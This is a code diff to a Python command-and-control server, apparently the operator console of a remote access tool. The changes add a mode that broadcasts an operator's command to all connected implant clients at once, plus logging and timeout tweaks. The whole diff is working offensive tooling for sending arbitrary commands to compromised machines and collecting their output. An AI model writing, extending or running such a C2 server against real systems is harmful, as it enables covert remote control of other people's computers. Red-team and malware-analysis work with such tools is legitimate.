@@ -38,8 +38,8 @@ class C2Server:
             s.settimeout(1.0)
             self.server = s
 
-            self.listening = log.waitfor(f"{self.host}:{self.port} Status", status='Listening')
-            self.listening.success()
+            #self.listening = log.waitfor(f"{self.host}:{self.port} Status", status='Listening')
+            #self.listening.success()
 
             while self.running:
                 try:
@@ -83,17 +83,17 @@ class C2Server:
     def send_command(self, command):
         client = self.select_client(self.current_client_index)
         if not client:
-            log.warning("[!] No active clients")
+            log.warning("No active clients")
             return
         if command.strip() == "":
             return
         try:
             client.send(command.encode())
-            time.sleep(0.01)
+            client.settimeout(2.0)
             response = client.recv(4096).decode()
             return response
         except Exception as e:
-            log.warning(f"[!] Error: {e}")
+            log.warning(f"Error: {e}")
             self.clients.remove(client)
 
     def remove_dead(self):
@@ -109,7 +109,7 @@ class C2Server:
         self.clients = alive_clients
 
 if __name__ == "__main__":
-    items = ["Start Server","Check Clients", "Connect to Client", "Exit"]
+    items = ["Start Server","Check Clients", "Connect to Client", "Send to All Clients", "Exit"]
     running = False
     server = C2Server()
     server_thread = None
@@ -122,20 +122,24 @@ if __name__ == "__main__":
         exit(0)
     signal.signal(signal.SIGINT, handle_sigint)
 
-    def resetgui():
-        input("\nPress enter to continue...")
-        os.system("cls" if os.name == "nt" else "clear")
-        
-    def interactive():
+    def interactive(sendall = False):
         run = True
         runstatus = log.waitfor(f"Interactive mode | enter 'return' to quit | STATUS = ", status = "Commanding")
         while run:
             command = str_input('C2> ')
             if command == "return":
                     run = False
+                    log.info("Returning...\n")
             else:
-                output = server.send_command(command)
-                log.info(output)
+                if sendall:
+                    for i in range(len(server.clients)):
+                        server.select_client(i)
+                        output = server.send_command(command)
+                        log.info(output)
+                    log.info("Finished sending to all clients")
+                else:
+                    output = server.send_command(command)
+                    log.info(output)
         runstatus.success()
 
     print(art)
@@ -163,7 +167,7 @@ if __name__ == "__main__":
                     format = format[1].strip(">")
                     log.info(format)
             else:
-                log.info("No clients connected")
+                log.warning("No clients connected")
         elif choice == 2:	# Connect to a Client
                 if len(server.clients) > 0:
                     server.remove_dead()
@@ -186,15 +190,20 @@ if __name__ == "__main__":
                             else:
                                 output = server.send_command(implant[c2choice])
                                 log.info(output)
-                            resetgui()
                         else:
                             log.info("Returning...\n")
                             run = False
                 else:
-                    log.info("No clients connected")
+                    log.warning("No clients connected")
+        elif choice == 3: #sendall
+            if len(server.clients) > 0:
+                server.remove_dead()
+                interactive(True)
+            else:
+                log.warning("No clients connected")
         else:
             server.stop()
-            os.system("cls" if os.name == "nt" else "clear")
+            #os.system("cls" if os.name == "nt" else "clear")
             ratrace = False
             splash()
-        resetgui()
+            input("Press enter to continue...")
